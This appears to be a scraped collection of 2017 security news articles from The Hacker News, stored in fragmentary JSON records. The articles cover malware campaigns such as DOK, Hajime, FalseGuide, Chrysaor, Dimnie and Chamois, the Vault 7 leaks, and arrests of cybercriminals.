Three Chinese hackers have been ordered to pay $8.8 million (£6.8 million) after hacking email servers of two major New York-based law firms to steal corporate merger plans in December 2016 and used them to trade stocks. The U.S. District Judge Valerie Caproni in Manhattan sued 26-year-old Iat Hong, 30-year-old Bo Zheng, and 50-year-old Hung Chin, over a multi-million dollar insider trading scam. According to BBC News, the U.S. Securities Exchange Commission (SEC) alleged the three hackers targeted 7 different law firms, but managed to installed malware on networks belonging to two law firms only, then compromised their IT admin accounts that gave the trio access to every email account at the firms. Access to the email and web servers allowed them to gain information on planned business mergers and/or acquisitions. The trio then used this information to buy company stock before the deal, and then sell it after the public announcement of the merger or acquisition. The hackers made more than $4 Million in illegal profits and could face at least decades-long prison sentences if found guilty. \"The trio then bought shares in listed companies ahead of announcements about their merger plans – something that often causes the stock to jump,\" BBC says. \"The counts against them include conspiracy to commit securities fraud, conspiracy to commit wire fraud, wire fraud, conspiracy to commit computer intrusion, unlawful access, and intentional damage.\"All the three hackers were charged in December 2016 both by the Securities and Exchange Commission (SEC), and the Department of Justice (DoJ). However, neither of them identified the affected law firms. Mr. Hong has been ordered to pay $1.8 Million, Mr. Zheng to pay $1.9 Million, and Mr. Chin to pay $4 Million. Any United States assets they own will also be seized. For now, only Hong, who was arrested in last December in Hong Kong, is in custody and yet to be extradited to the United States, while other two cyber criminals are on the run." }

Unfortunately, No. According to the McAfee Labs, malware attacks on Apple's Mac computers were up 744% in 2016, and its researchers have discovered nearly 460,000 Mac malware samples, which is still just a small part of overall Mac malware out in the wild. Today, Malware Research team at CheckPoint have discovered a new piece of fully-undetectable Mac malware, which according to them, affects all versions of Mac OS X, has zero detections on VirusTotal and is \"signed with a valid developer certificate (authenticated by Apple).\" Dubbed DOK, the malware is being distributed via a coordinated email phishing campaign and, according to the researchers, is the first major scale malware to target macOS users. The malware has been designed to gain administrative privileges and install a new root certificate on the target system, which allows attackers to intercept and gain complete access to all victim communication, including SSL encrypted traffic. Just almost three months ago, Malwarebytes researchers also discovered a rare piece of Mac-based espionage malware, dubbed Fruitfly, that was used to spy on biomedical research center computers and remained undetected for years. Here's How the DOK Malware Works: The malware is distributed via a phishing email masquerading as a message regarding supposed inconsistencies in their tax returns, tricking the victims into running an attached malicious .zip file, which contains the malware. Since the malware author is using a valid developer certificate signed by Apple, the malware easily bypasses Gatekeeper -- an inbuilt security feature of the macOS operating system by Apple. Interestingly, the DOK malware is also undetectable in almost all antivirus products. Once installed, the malware copies itself to the /Users/Shared/ folder and then add to \"loginItem\" in order to make itself persistent, allowing it to execute automatically every time the system reboots, until it finishes to install its payload. The malware then creates a window on top of all other windows, displaying a message claiming that a security issue has been identified in the operating system and an update is available, for which the user has to enter his/her password. Once the victim installed the update, the malware gains administrator privileges on the victim's machine and changes the victim system's network settings, allowing all outgoing connections to pass through a proxy. According to CheckPoint researchers, \"using those privileges, the malware will then install brew, a package manager for OS X, which will be used to install additional tools – TOR and SOCAT.\" DOK Deletes itself after Setting up Attacker's Proxy The malware then installs a new root certificate in the infected Mac, which allows the attacker to intercept the victim’s traffic using a man-in-the-middle (MiTM) attack. \"As a result of all of the above actions, when attempting to surf the web, the user’s web browser will first ask the attacker web page on TOR for proxy settings,\" the researchers say. \"The user traffic is then redirected through a proxy controlled by the attacker, who carries out a Man-In-the-Middle attack and impersonates the various sites the user attempts to surf. The attacker is free to read the victim's traffic and tamper with it in any way they please.\" According to researchers, almost no antivirus has updated its signature database to detect the DOK OS X malware, as the malware deletes itself once it modifies proxy settings on the target machines for interceptions. Apple can resolve this issue just by revoking the developer certificate being abused by the malware author. Meanwhile, users are always recommended to avoid clicking links contained in messages or emails from untrusted sources and always pay extra attention before proving your root password. Update: Apple Revokes Certificate Used By Dok Mac Malware After this story had gone up, Apple responded to the issue and revoked the legitimate developer certificate used by hackers behind the DOK malware that can be used to eavesdrop on victim's communication, including secure HTTPS traffic. MalwareBytes has confirmed this in its blog post, which reads: \"Apple has already revoked the certificate used to sign the app, so, at this point, anyone who encounters this malware will be unable to open the app and unable to be infected by it.\" It further adds: \"If the user clicks past this warning to open the app, it will display a warning that the file could not be opened, which is simply a cover for the fact that no document opened, as shown above.\" Besides this, Apple also rolled out an update this weekend to its XProtect built-in anti-malware software in an attempt to prevent existing and future DOK-type malware attacks." }
{ "_id" : { "$oid" : "5b35be556cefc42b002934eb" }, "Category" : "Malware", "Title" : "Hajime ‘Vigilante Botnet’ Growing Rapidly; Hijacks 300,000 IoT Devices Worldwide", "Address" : "https://thehackernews.com/2017/04/vigilante-hacker-iot-botnet_26.html", "Date" : "2017-04-26T21:48:00-11:00", "Article" : "Last week, we reported about a so-called 'vigilante hacker' who hacked into at least 10,000 vulnerable 'Internet of Things' devices, such as home routers and Internet-connected cameras, using a botnet malware in order to supposedly secure them. Now, that vigilante hacker has already trapped roughly 300,000 devices in an IoT botnet known as Hajime, according to a new report published Tuesday by Kaspersky Lab, and this number will rise with each day that passes by. The IoT botnet malware was emerged in October 2016, around the same time when the infamous Mirai botnet threatened the Internet last year with record-setting distributed denial-of-service (DDoS) attacks against the popular DNS provider Dyn. How the Hajime IoT Botnet Works Hajime botnet works much like Mirai by spreading itself via unsecured IoT devices that have open Telnet ports and uses default passwords and also uses the same list of username and password combinations that Mirai is programmed to use. However, the interesting part of Hajime botnet is that, unlike Mirai, once Hajime infects an IoT devices, it secures the devices by blocking access to four ports (23, 7547, 5555, and 5358) known to be the most widely used vectors for infecting IoT devices, making Mirai or other threats out of their bay. Hajime also uses a decentralized peer-to-peer network (instead of command-and-control server) to issue updates to infected devices, making it more difficult for ISPs and Internet providers to take down the botnet. One of the most interesting things about Hajime is the botnet also displays a cryptographically signed message every 10 minutes or so on infected device terminals, describing its creators as \"just a white hat, securing some systems.\" Unlike Mirai and other IoT botnets, Hajime lacks DDoS capabilities and other hacking skills except for the propagation code that lets one infected IoT device search for other vulnerable devices and infects them. But What if…? What's not known is: What the Hajime Botnet is for? or Who is behind it? \"The most intriguing thing about Hajime is its purpose,\" says Kaspersky security researchers. \"While the botnet is getting bigger and bigger, partly due to new exploitation modules, its purpose remains unknown. We haven’t seen it being used in any type of attack or malicious activity, adding that \"its real purpose remains unknown.\" Also, the researchers believe that this might not happen, because Hajime botnet takes steps to hide its running processes and files on the file system, making the detection of infected systems more difficult. So far, the purpose behind building this botnet is not entirely clear, but all signs yet point to a possible white-hat hacker, who is on his/her mission to secure open and vulnerable systems over the Internet. However, the most concerning issue of all — Is there any guarantee that the Hajime author will not add attack capabilities to the worm to use the hijacked devices for malicious purposes? Maybe today the Hajime author is in the mission to secure the world, but tomorrow, when he would realize he could make money online by renting his/her botnet to others, he could be another Adam Mudd. Mudd, a 19-year-old teenager, has recently been sentenced to 2 years in prison for creating and running a DDoS-for-hire service called 'Titanium Stresser' that made more than 1.7 million victims of DDoS attacks since 2013. Secondly, What if the well-intentioned botnet is hijacked by some malicious actor? If this happens, the vigilant IoT botnet could be used for malicious purposes, such as conducting DDoS attacks against online sites and services, spreading malware, or instantly bricking the infected devices at one click. Radware researchers also believe that the flexible and extensible nature of the Hajime botnet can be used for malicious purposes, like those mentioned above and conducting real-time mass surveillance from Internet-connected webcams, according to a new threat advisory published Wednesday by Radware. Last but not the least: Do we seriously need some vigilante hackers to protect our devices and network? This solution could be temporary, trust me. For example, the latest Hajime botnet is nothing but a band-aid. Since Hajime has no persistence mechanism, as soon as the infected device is rebooted, it goes back to its previously unsecured state, with default passwords and the Telnet port open to the world. How to Protect your IoT devices? The only true solution is You — Instead of just sitting over there, doing nothing and waiting for some vigilante hackers to do miracles, you can protect your IoT devices in a way Hajime or any well-intentioned botnet can't do. So go and update the firmware of your devices, change their default passwords, put them behind a firewall, and if any device is by default vulnerable and cannot be updated, throw it and buy a new one. Just keep in mind: Once a single IoT of yours gets compromised, your whole network falls under risk of getting compromised and so all your devices which are connected to that network." }

Yes, about 2 Million Android users have fallen victim to malware hidden in over 40 fake companion guide apps for popular mobile games, such as Pokémon Go and FIFA Mobile, on the official Google Play Store, according to security researchers from Check Point. Dubbed FalseGuide by the Check Point researchers, the malware creates a \"silent botnet out of the infected devices\" to deliver fraudulent mobile adware and generate ad revenue for cybercriminals. Nearly 2 Million Android Users Infected! While initially it was believed that the oldest instance of FalseGuide was uploaded to the Google Play in February and made its way onto over 600,000 devices within two months, further in-depth analysis by researchers revealed more infected apps which date back to November 2016. \"Since April 24, when the article below was first published, Check Point researchers learned that the FalseGuide attack is far more extensive than originally understood,\" Check Point researchers wrote in a blog post. \"The apps were uploaded to the app store [Google Play Store] as early as November 2016, meaning they hid successfully for five months, accumulating an astounding number of downloads.\" Russian connection with FalseGuide Check Point researchers discovered five additional apps containing the FalseGuide malware on Google Play Store, developed by \"Anatoly Khmelenko\" (translated from Russian Анатолий Хмеленко). Also, the first batch of malicious apps was submitted under the Russian names of two fake developers, Sergei Vernik and Nikolai Zalupkin, which suggests the malware is of Russian origin. FalseGuide attempts to turn infected devices into a botnet that could allow its operator to control the devices without the knowledge of the device owners. Here's How FalseGuide Works: While downloading to the victim's phone, FalseGuide requests administrative permissions to the device in an attempt to avoid being deleted by the user. The malware then registers itself with Firebase Cloud Messaging – a cross-platform messaging service that allows app developers to send messages and notifications. Once subscribed to this service, FalseGuide can allow the attackers to send messages containing links to additional malware and install them to the infected device, enabling attackers to display illegitimate pop-up ads out of context and generate revenue. Depending on their objectives, the attackers could also inject highly malicious code into an infected device to root it, conduct a Distributed Denial of Service (DDoS) attack, or even penetrate private networks. Google Removed the Malware hidden Apps, but are you Clean? Check Point has provided a full list of malicious apps hiding FalseGuide, which posed as guides for FIFA Mobile, Criminal Case, Super Mario, Subway Surfers, Pokemon Go, Lego Nexo Knights, Lego City My City, Ninjago Tournament, Rolling Sky, Amaz3ing Spider-Man, Drift Zone 2, Dream League Soccer, and many more. Check Point researchers notified Google about FalseGuide in February, after which the company silently removed the malware apps from the Play Store. But despite being removed, the malicious apps are likely still active on a number of devices, leaving Android users open to cyber attacks. \"Mobile botnets are a growing trend since early last year, growing in both sophistication and reach,\" CheckPoint said. \"This type of malware manages to infiltrate Google Play due to the non-malicious nature of the first component, which only downloads the actual harmful code.\" How to Protect yourself against such Malware There are standard protection measures you need to follow to remain unaffected: Always download apps which are from trusted and verified developers and stick to trusted sources, like Google play Store and the Apple App Store. Always verify app permissions before installing apps. If any app is asking more than what it is meant for, just do not install it. Keep a good antivirus app on your device that can detect and block such malware before it can infect your device. Always keep the app up-to-date. Do not download apps from third party source. Although in this case, the app is being distributed through the official Play Store, most often such malware are distributed via untrusted third-party app stores. Avoid unknown and unsecured Wi-Fi hotspots and Keep your Wi-Fi turned OFF when not in use. Be careful which apps you give administrative rights to. Admin rights are powerful and can give an app full control of your device. Never click on links in SMS or MMS sent to your mobile phone. Even if the email looks legit, go directly to the website of origin and verify any possible updates." }

Peter Yuryevich Levashov, 32-years-old Russian computer programmer, suspected of operating the Kelihos botnet — a global network of over 100,000 infected computers that was used to deliver spam, steal login passwords, and infect computers with ransomware and other types of malware since approximately 2010, the U.S. Justice Department announced Monday. As suspected earlier, Levashov, also known as Peter Severa, is the same man who has also been listed in the World's Top 10 Worst Spammers maintained by anti-spam group Spamhaus, which has given him the 7th position in the list. The arrest was made possible after the FBI learned just last month that Levashov was traveling with his family to Spain from his home in Russia, a country without any extradition treaty to the United States. Initially, it was believed that Levashov was detained on suspicion of 2016 US election hack, after his wife told Russian publication RT that authorities said her husband’s apprehension was in part due to his involvement in the U.S. election hacking, including the notorious breach of the Democratic National Committee (DNC). However, the DoJ press release indicates no link between Levashov and US election hack at all. Instead, Levashov was linked to the Kelihos botnet by the FBI because he used the same IP address to operate the botnet that he used to access his email and other online accounts in his name, including Apple iCloud and Google Gmail accounts. According to the indictment unsealed Monday, Levashov operated the botnet since 2010, targeting Microsoft Windows machines for infection. He allegedly used Kelihos to distribute hundreds of millions of spam emails per year, and pump-and-dump stock scams. Besides conducting spamming operations, prosecutors also alleged Levashov also used the Kelihos botnet to infect end-user computers with malware and harvest passwords to online and bank accounts belonging to thousands of Americans. \"The ability of botnets like Kelihos to be weaponized quickly for vast and varied types of harms is a dangerous and deep threat to all Americans, driving at the core of how we communicate, network, earn a living, and live our everyday lives,\" said Acting Assistant Attorney General Blanco. \"Our success in disrupting the Kelihos botnet was the result of strong cooperation between private industry experts and law enforcement, and the use of innovative legal and technical tactics.\" The FBI officials obtained court orders (Rule 41 of the Federal Rules of Criminal Procedure) to redirect Kelihos-infected PCs to servers operated by authorities — a process known as \"Sinkhole attack\" — and to block any attempts by the botnet to regain control of those sinkholed computers. The FBI said it worked with security firm CrowdStrike and Shadowserver Foundation, a volunteer group of information security experts, to deploy the sinkhole attack to disconnect communications between criminals and infected computers. Levashov has been charged with wire fraud and unauthorized interception of electronic communications. The government is now seeking his extradition to the United States." }

Since March, as part of its \"Vault 7\" series, Wikileaks has published over 8,761 documents and other confidential information that the whistleblower group claims came from the US Central Intelligence Agency (CIA). Now, researchers at cybersecurity company Symantec reportedly managed to link those CIA hacking tools to numerous real cyber attacks in recent years that have been carried out against the government and private sectors across the world. Those 40 cyber attacks were conducted by Longhorn — a North American hacking group that has been active since at least 2011 and has used backdoor trojans and zero-day attacks to target government, financial, energy, telecommunications, education, aerospace, and natural resources sectors. Although the group's targets were all in the Middle East, Europe, Asia, and Africa, researchers said the group once infected a computer in the United States, but an uninstaller was launched within an hour, which indicates the \"victim was infected unintentionally.\" What's interesting is that Symantec linked some of CIA hacking tools and malware variants disclosed by Wikileaks in the Vault 7 files to Longhorn cyber espionage operations. Fluxwire (Created by CIA) ≅ Corentry (Created by Longhorn) Fluxwire, a cyber espionage malware allegedly created by the CIA and mentioned in the Vault 7 documents, contains a changelog of dates for when new features were added, which according to Symantec, closely resemble with the development cycle of \"Corentry,\" a malware created by Longhorn hacking group. \"Early versions of Corentry seen by Symantec contained a reference to the file path for the Fluxwire program database (PDB) file,\" Symantec explains. \"The Vault 7 document lists removal of the full path for the PDB as one of the changes implemented in Version 3.5.0.\" \"Up until 2014, versions of Corentry were compiled using GCC [GNU Compiler Collection]. According to the Vault 7 document, Fluxwire switched to an MSVC compiler for version 3.3.0 on February 25, 2015. This was reflected in samples of Corentry, where a version compiled on February 25, 2015, had used MSVC as a compiler.\" Similar Malware Modules Another Vault 7 document details 'Fire and Forget' specification of the payload and a malware module loader called Archangel, which Symantec claims, match almost perfectly with a Longhorn backdoor called Plexor. \"The specification of the payload and the interface used to load it was closely matched in another Longhorn tool called Backdoor.Plexor,\" says Symantec. Use of Similar Cryptographic Protocol Practices Another leaked CIA document outlined cryptographic protocols that should be used within malware tools, such as using AES encryption with a 32-bit key, inner cryptography within SSL to prevent man-in-the-middle attacks, and key exchanges once per connection. One leaked CIA document also recommends using of in-memory string de-obfuscation and Real-time Transport Protocol (RTP) for communicating with the command and control (C&C) servers. According to Symantec, these cryptographic protocol and communication practices were also used by Longhorn group in all of its hacking tools. More About LongHorn Hacking Group Longhorn has been described as a well-resourced hacking group that works on a standard Monday to Friday working week — likely a behavior of a state-sponsored group — and operates in an American time zone. Longhorn's advanced malware tools are specially designed for cyber espionage with detailed system fingerprinting, discovery, and exfiltration capabilities. The group uses extremely stealthy capabilities in its malware to avoid detection. Symantec analysis of the group's activities also shows that Longhorn is from an English speaking North American country with code words used by it referring, the band The Police with code words REDLIGHT and ROXANNE, and colloquial terms like \"scoobysnack.\" Overall, the functionality described in the CIA documents and its links to the group activities leave \"little doubt that Longhorn's activities and the Vault 7 documents are the work of the same group.\"" }

Named Grasshopper, the latest batch reveals a CLI-based framework developed by the CIA to build \"customised malware\" payloads for breaking into Microsoft's Windows operating systems and bypassing antivirus protection. All the leaked documents are basically a user manual that the agency flagged as \"secret\" and that are supposed to be only accessed by the members of the agency, WikiLeaks claims. Grasshopper: Customized Malware Builder Framework According to the leaked documents, Grasshopper framework allows the agency members to easily create custom malware, depending upon the technical details, such as what operating system and antivirus the targets are using. The Grasshopper framework then automatically puts together several components sufficient for attacking the target, and finally, delivers a Windows installer that the agency members can run on a target's computer and install their custom malware payloads. \"A Grasshopper executable contains one or more installers. An installer is a stack of one or more installer components,\" the documentation reads. \"Grasshopper invokes each component of the stack in series to operate on a payload. The ultimate purpose of an installer is to persist a payload.\" The whistleblowing website claimed the Grasshopper toolset was allegedly designed to go undetected even from the anti-virus products from the world's leading vendors including Kaspersky Lab, Symantec, and Microsoft. CIA's Grasshopper Uses 'Stolen' Russian Malware According to WikiLeaks, the CIA created the Grasshopper framework as a modern cyber-espionage solution not only to be as easy to use as possible but also \"to maintain persistence over infected Microsoft Windows computers.\" \"Grasshopper allows tools to be installed using a variety of persistence mechanisms and modified using a variety of extensions (like encryption),\" Wikileaks said in the press release. One of the so-called persistence mechanisms linked to Grasshopper is called Stolen Goods (Version 2), which shows how the CIA adapted known malware developed by cyber criminals across the world and modified it for its own uses. One such malware is \"Carberp,\" which is a malware rootkit developed by Russian hackers. \"The persistence method and parts of the installer were taken and modified to fit our needs,\" the leaked document noted. \"A vast majority of the original Carberp code that was used has been heavily modified. Very few pieces of the original code exist unmodified.\" It is not yet clear how recently the CIA has used the hacking tools mentioned in the documentation, but WikiLeaks says the tools were used between 2012 and 2015. So far, Wikileaks has revealed the \"Year Zero\" batch which uncovered CIA hacking exploits for popular hardware and software, the \"Dark Matter\" batch which focused on exploits and hacking techniques the agency designed to target iPhones and Macs, and the third batch called \"Marble.\" Marble revealed the source code of a secret anti-forensic framework, basically an obfuscator or a packer used by the CIA to hide the actual source of its malware." }

According to a new report published today by Fidelis Cybersecurity firm, the Chinese APT10 hacking group implanted a piece of malware on the \"Events\" page of the US National Foreign Trade Council (NFTC) website in February. Dubbed 'Operation TradeSecret,' the attack against the NFTC site is seen as an attempt to conduct surveillance on the main industry players and lobbyists closely associated with U.S trade policy activities. Researchers say hackers placed a malicious link on the NFTC website, inviting the organization's board of directors to register for a meeting in Washington DC on March 7. But clicking on the link deployed a spying tool called \"Scanbox.\" Dates back to 2014, Scanbox – previously used by nation-state threat actors associated with the Chinese government – has the ability to record the type and versions of software a victim is running and run keyloggers on compromised computers, said Fidelis researcher John Bambenek. \"This attack was really at its core a reconnaissance attack. Anyone who visited this calendar entry would expose their software versions and use a JavaScript keylogger that could expose their identity,\" said Bambenek. \"Traditionally these attacks are used to precisely identify targets and help them craft targeted phishing attacks using exploits they know the victim is vulnerable to.\" The malicious link was active on the NFTC website between February 27 and March 1. The malware was already removed from the site by the time Fidelis contacted NFTC. The NFTC's staff and board represent many influential people and companies -- from President Rufus Yerxa, the U.S. Ambassador to GATT to executives from major companies including Google, Amazon, eBay, IBM, Coca-Cola, Microsoft, Oracle, Cisco, KPMG, Pfizer, Visa, Ford, Halliburton, and Walmart. Although Fidelis detected no further attacks on NFTC board members, the security firm believed the hackers were after a full range of entities relevant to the trade negotiations due to take place Thursday between US and China. This is the second time in a week when APT10 cyber espionage campaign has come to light. A report released this week by BAE Systems, and PwC also claimed that APT10 was targeting managed IT services providers (MSPs) and their customers across the globe to steal sensitive data." }

Dubbed Chrysaor, the Android spyware has been used in targeted attacks against activists and journalists mostly in Israel, but also in Georgia, Turkey, Mexico, the UAE and other countries. Chrysaor espionage malware, uncovered by researchers at Lookout and Google, is believed to be created by the same Israeli surveillance firm NSO Group Technologies, who was behind the Pegasus iOS spyware initially detected in targeted attacks against human rights activists in the United Arab Emirates last year. NSO Group Technologies is believed to produce the most advanced mobile spyware on the planet and sold them to governments, law enforcement agencies worldwide, as well as dictatorial regimes. The newly discovered Chrysaor spyware has been found installed on fewer than three-dozen Android devices, although researchers believe that there were more victims before its detection, who most likely have either formatted or upgraded their phones. \"Although the applications were never available in Google Play, we immediately identified the scope of the problem by using Verify Apps,\" Google said in its own blog post published Monday. \"We've contacted the potentially affected users, disabled the applications on affected devices, and implemented changes in Verify Apps to protect all users.\" Just like Pegasus for iOS, the newly discovered Chrysaor for Android also offers a wide array of spying functions, including: Exfiltrating data from popular apps including Gmail, WhatsApp, Skype, Facebook, Twitter, Viber, and Kakao. Controlling device remotely from SMS-based commands. Recording Live audio and video. Keylogging and Screenshot capture. Disabling of system updates to prevent vulnerability patching. Spying on contacts, text messages, emails and browser history. Self-destruct to evade detection \"If it feels like it's going to be found, it removes itself,\" said Lookout Security researcher Michael Flossman. \"That's why it took so long to find these samples.\" Researchers believe that Chrysaor APK has also been distributed via SMS-based phishing messages, just like Pegasus infection on iOS devices. While Pegasus leveraged three then-zero day vulnerabilities in Apple's iOS operating system to jailbreak the targeted iOS devices, Chrysaor uses a well-known Android-rooting exploit called Framaroot to root the device and gain full control over the operating system. Since Chrysaor dates back to 2014, there are possibilities that NSO group might have discovered zero-day vulnerabilities in Android and deployed them on the latest version of Chrysaor for Android, Lookout warned. Lookout has also provided full, technical details on Chrysaor in its report [PDF] titled \"Pegasus for Android: Technical Analysis and Findings of Chrysaor.\" So, you can head on to the link for a more detailed explanation on the malware.

Dubbed Dimnie, the reconnaissance and espionage trojan has the ability to harvest credentials, download sensitive files, take screenshots, log keystrokes on 32-bit and 64-bit architectures, download additional malware on infected systems, and self-destruct when ordered to. The malware has largely flown under the radar for the past three years – Thanks to its stealthy command and control methods. The threat was discovered in the mid of January this year when it was targeting multiple owners of Github repositories via phishing emails, but cyber-security firm Palo Alto, who reported the campaign on Tuesday, says the attacks started a few weeks before. Here's How the Attack Works: The attack starts by spamming the email inboxes of active GitHub users with booby-trapped job offers. The messages used in this campaign attempt to trick the victims into running an attached malicious .doc file. The doc file contains embedded macro code, which if allowed, executes a PowerShell command to download and install the Dimnie trojan – malware that can be controlled remotely, enabling attackers to hijack infected PCs and install additional malware. Dimnie is not new; it first appeared in early 2014, but the use of stealthy command and control (C&C) methods in the new version of the Dimnie malware helped the threat remain unnoticed until this year. Dimnie's Stealthy Features let it went Undetected for 3 Years This new iteration has the ability to hide its malicious traffic under fake domains and DNS requests. To camouflage its connection, Dimnie uses HTTP Proxy requests that appear to be sent to Google-owned domains, but it's actually talking to an address controlled by the attackers, which has nothing to do with Google. For more stealthiness, the malware encrypts all of its modules during transit, and once they are received and decrypted on the targeted computer, they are never written to or executed on its hard drive. Instead, Dimnie injects them directly into the memory of core Windows processes, which then execute in the OS memory itself, without leaving its traces on the user's disks. This lets Dimnie operators inject their malicious module into the process of any legit application. \"The global reach of the January 2017 campaign which we analyzed in this post is a marked departure from previous Dimnie targeting tactics. Multiple factors have contributed to Dimnie's relatively long-lived existence,\" Palo researchers concluded. \"By masking upload and download network traffic as innocuous user activity, Dimnie has taken advantage of defenders’ assumptions about what normal traffic looks like. This blending in tactic, combined with a prior penchant for targeting systems used by Russian speakers, likely allowed Dimnie to remain relatively unknown.\" Since the malware hides its communications behind regular traffic and executes in the OS memory, Palo researchers unable to speculate the attackers behind the latest phishing email campaign or their exact motivations to target open-source developers. However, gaining access to computers belonging to owners of private GitHub repositories gives attackers a way to access the source code of the application they manage for their organizations, which let the attackers gain access to the internal networks of various organizations." }

Mark Vartanyan, 29, who was very well known as \"Kolypto,\" pleaded guilty in an Atlanta courtroom on Monday to charges related to computer fraud and is now co-operating with federal prosecutors in return for a reduced sentence of no more than five years in prison. Vartanyan, a native of Moscow, was arrested in Norway in October 2014 and extradited to the United States in December last year. He was involved in the development, improvement, maintenance and distribution of the nasty Citadel Trojan. \"This successful extradition is yet another example of how cooperation among international law enforcement partners can be used to disrupt and dismantle global cyber syndicates,\" said U.S. Attorney John Horn. \"This defendant's alleged role in developing and improving Citadel for its use by cyber criminals caused a vast amount of financial harm to individuals and institutions around the world. His appearance in federal court today shows that cyber criminals cannot hide in the shadows of the Internet. We will identify them and bring them to justice wherever they operate.\" Initially developed in 2011, Citadel Trojan – a variant of the Zeus banking Trojan – was designed to infect computer systems and steal online banking credentials and other financial information by masquerading itself as legitimate banking sites. The offensive threat affected over 11 Million computers in at least 90 countries and estimated to have cost $500 million in losses over a three-year period. Citadel also introduced a business model that enabled online users to solicit their feedback and then incorporate those functionalities and tweaks in the product, making the malware gain widespread popularity. It was one of the first examples of malware-as–a-service (MaaS). Sold for up to $2,500, Citadel received regular automated updates, just like with the development of legitimate software programs, to enable the malware to avoid detection by antivirus products and other signature-based security controls. But eventually, Citadel's source code was leaked in 2013, which helped the antivirus firms to identify and block the threat. Vartanyan was one of many people who was involved in the development and distribution of the Citadel malware. Another Russian hacker Dimitry Belorossov, 22, aka Rainerfox, was also arrested in September 2015 and sentenced to four years and six months in prison after pleading guilty to charges related to the distribution of Citadel and infecting over 7,000 infected machines. Vartanyan is scheduled to be sentenced on 21 June 2017. Despite the two arrests, the US Department of Justice (DoJ) said its investigation into the creator of Citadel malware is still ongoing, indicating that further arrests may be made." }

The site quickly grays out, asking you to click yet another link that eventually lands you on a survey page that promises to reward you with an Amazon gift card as soon as you hand over your details. \"Suffice to say, filling this in hands your personal information to marketers – and there is no guarantee you will get any pictures at the end of it,\" said Chris Boyd, a malware intelligence analyst at Malwarebytes.Malware Hijacks Twitter Accounts to Spread Fappening SpamWhile you are looking through all these links, the creepy app spams out the same tweets from your account, leading your followers to the same The Fappening 2.0 scam you fell for. So far nearly 7,000 users have become a victim of the latest scam. \"As freshly leaked pictures and video of celebrities continue to be dropped online, so too will scammers try to make capital out of image-hungry clickers. Apart from the fact that these images have been taken without permission so you really shouldn’t be hunting for them, anyone going digging on less than reputable sites is pretty much declaring open season on their computers,\" Boyd concluded.Here are some useful tips you can follow in an effort to protect yourself from scams shared through social media: Don't take the bait. Stay away from promotions of \"exclusive,\" \"shocking\" or \"sensational\" photos or footage. If it sounds too outlandish to be true, it is probably a scam. Hover over links to see their real destination. Before you click on any link, mouseover the link to see where it'll take you. Do not click on links leading to unfamiliar sites. Don't trust your friends online. It might not actually be your friends who are liking or sharing scam links to photos. Their account may have been hijacked by scammers. Raise your Eyebrows when asked for something in return. Beware of any site that asks you to download and install software in order to view anything else, in this case, nude photos and videos of Paige. This is a known tactic of spreading scam." }

Adware has traditionally been used to aggressively push ads like banners or pop-ups on mobile screens to make money. The troublesome part is that Adware is now becoming trojanized and more sophisticated, as it aggressively collects personal data from the mobile device it's installed on, including name, birth date, location, serial number, contacts, and browser data without users' consent. However, the risk is a bit higher on Android than other platforms because of the extra permissions that apps enjoy. Although Google has stepped up its efforts to remove potentially harmful apps from its Play Store in the past years and added more stringent malware checks for new apps, Adware app eventually finds its way into its mobile app marketplace to target millions of Android users. In its recent efforts to make its Play Store ecosystem safe, Google has recently discovered a new massive ad-fraud family of a botnet that was infecting Android users through apps hosted on its official Play Store. Dubbed Chamois, the family of PHAs (potentially harmful applications) was capable of bombarding users with pop-up ads, boosting app promotion by automatically installing other applications in the background, subscribing users to premium services by sending text messages and downloading additional plugins without their knowledge. Google engineers said they caught Chamois after they discovered suspicious ad traffic while performing a routine ad traffic quality evaluation. Despite the fact that the app uses obfuscation and anti-analysis techniques to evade detection, Google engineers eventually uncovered a massive network of developers that had tricked users into installing malicious apps on their phones. The goal behind the malware-laced apps appears to have been ad fraud and make money by employing different techniques to bypass Google's detection and prevention systems. \"We analyzed malicious apps based on Chamois, and found that they employed several methods to avoid detection and tried to trick users into clicking ads by displaying deceptive graphics,\" security software engineers at Google said in a blog post. \"This sometimes resulted in downloading of other apps that commit SMS fraud. So we blocked the Chamois app family using Verify Apps and also kicked out bad actors who were trying to game our ad systems.\" The Chamois apps had a multi-stage payload structure, including a custom encrypted storage area for configuration files and additional code, which required deeper analysis to understand the malicious part. According to the Google engineers, their security teams had to look through more than 100,000 lines of sophisticated code written by seemingly professional developers in an effort to figure out exactly what the Chamois-related apps were up to. After the discovery of Chamois, Google blocked the Chamois app family using its Verify Apps and also banned some people who were trying to take advantage of its ad system to make money on the adware apps. Google also updated its app testing system that is now capable of detecting this new Chamois-related threat." }

Pre-Installed Android Malware Found On 36 High-end Smartphones", "Address" : "https://thehackernews.com/2017/03/android-malware-apps.html", "Date" : "2017-03-10T21:59:00-11:00", "Article" : "Bought a brand new Android Smartphone? Do not expect it to be a clean slate. At least 36 high-end smartphone models belonging to popular manufacturing companies such as Samsung, LG, Xiaomi, Asus, Nexus, Oppo, and Lenovo, which are being distributed by two unidentified companies have been found pre-loaded with malware programs. These malware infected devices were identified after a Check Point malware scan was performed on Android devices. Two malware families were detected on the infected devices: Loki and SLocker. According to a blog post published Friday by Check Point researchers, these malicious software apps were not part of the official ROM firmware supplied by the smartphone manufacturers but were installed later somewhere along the supply chain, before the handsets arrived at the two companies from the manufacturer's factory. First seen in February 2016, Loki Trojan inject devices right inside core Android operating system processes to gain powerful root privileges. The trojan also includes spyware-like features, such as grabbing the list of current applications, browser history, contact list, call history, and location data. On the other hand, SLocker is a mobile ransomware that locks victims devices for ransom and communicates through Tor in order to hide the identity of its operators. List of Popular Smartphones Infected with Malware Here's the list of infected smartphones: Galaxy Note 2 LG G4 Galaxy S7 Galaxy S4 Galaxy Note 4 Galaxy Note 5 Xiaomi Mi 4i Galaxy A5 ZTE x500 Galaxy Note 3 Galaxy Note Edge Galaxy Tab S2 Galaxy Tab 2 Oppo N3 Vivo X6 plus Nexus 5 Nexus 5X Asus Zenfone 2 LenovoS90 OppoR7 plus Xiaomi Redmi Lenovo A850 The malware backdoor offers its operator unrestricted access to these infected devices, from downloading, installing and activating Android malicious apps, deleting user data, uninstalling security software and disabling system apps, to dialing premium phone numbers. This incident underscores the dangers of untrusted supply chains, and experts are quite worried about the security of the supply chain with reports of over 20 incidents where rogue retailers have managed to pre-install malware on new Android handsets. Here's How to Remove the Malware Infections: Since the malware programs were installed to the device's ROM using system privileges, it's hard to get rid of the infections. To remove the malware from the infected devices, either you can root your device and uninstall the malware apps easily, or you would need to completely reinstall the phone firmware/ROM via a process called \"Flashing.\" Flashing is a complex process, and it is recommended that users power off their device and approach a certified 